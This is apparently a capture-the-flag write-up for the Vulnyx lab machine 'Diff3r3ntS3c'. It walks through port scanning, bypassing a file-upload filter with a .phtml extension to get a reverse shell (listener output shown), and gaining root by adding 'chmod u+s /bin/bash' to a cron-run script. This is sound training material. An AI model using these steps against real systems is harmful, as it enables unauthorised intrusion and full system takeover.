---
layout: single 
title: Diff3r3ntS3c - Vulnyx
date: 2024-06-13
classes: wide
header:
  teaser: /assets/images/vulnyx-writeup-diff3r3nts3c/diff_logo.png
  teaser_home_page: true
  icon: /assets/images/vulnyx.png
categories:
  - Vulnyx
  - Low
tags:
  - Arbitrary File Upload
  - Abusing Cronjob Vulnerability
---

![logo](/assets/images/vulnyx-writeup-diff3r3nts3c/diff_logo.png)

## Port Scanning

```bash
sudo nmap -p- -sS --min-rate 5000 -vvv -n -Pn 192.168.1.111
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-13 19:01 CEST
Initiating ARP Ping Scan at 19:01
Scanning 192.168.1.111 [1 port]
Completed ARP Ping Scan at 19:01, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 19:01
Scanning 192.168.1.111 [65535 ports]
Discovered open port 80/tcp on 192.168.1.111
Completed SYN Stealth Scan at 19:01, 0.79s elapsed (65535 total ports)
Nmap scan report for 192.168.1.111
Host is up, received arp-response (0.000041s latency).
Scanned at 2024-06-13 19:01:05 CEST for 1s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 00:0C:29:FD:18:1D (VMware)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.00 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

## Service Discovery

```bash
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.57 ((Debian))
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Diff3r3ntS3c
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 00:0C:29:FD:18:1D (VMware)
```

## Method 1

We only have port 80 open. If we look at the webpage, we get the following information:
![form](/assets/images/vulnyx-writeup-diff3r3nts3c/form.png)

Since we have a form, let's try to exploit an arbitrary file upload vulnerability.

If we try to upload a .php file, we get the following error:

![error](/assets/images/vulnyx-writeup-diff3r3nts3c/error.png)

After trying several extensions, we get the correct one -> *.phtml*

To see where the uploaded file is located, we perform a scan with gobuster:
```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.111/
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.111/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 315] [--> http://192.168.1.111/images/]
/uploads              (Status: 301) [Size: 316] [--> http://192.168.1.111/uploads/]
/assets               (Status: 301) [Size: 315] [--> http://192.168.1.111/assets/]
/server-status        (Status: 403) [Size: 278]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
```
We can see that we have a directory called /uploads where the files we upload will be stored.

If we check this directory, we can see that the file with a reverse shell that we uploaded is there. If we execute it, we get a reverse shell.

```bash
nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.1.110] from (UNKNOWN) [192.168.1.111] 58210
Linux Diff3r3ntS3c 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64 GNU/Linux
 21:09:56 up 10 min,  0 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1000(candidate) gid=1000(candidate) groups=1000(candidate)
/bin/sh: 0: can't access tty; job control turned off
```

Once we have the reverse shell, we try to escalate privileges. To do this, we check if there is any suspicious task running with crontab
```bash
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#
* * * * * root /bin/sh /home/candidate/.scripts/makeBackup.sh
```

As we can see in the result, we have a script that we can execute as root in the .scripts directory of our user.

We can modify this script to get a root shell with the following line `chmod u+s /bin/bash`

We wait for the task to run again and then execute the command `bash -p` to get the root shell:
```bash
bash-5.2# whoami
root
```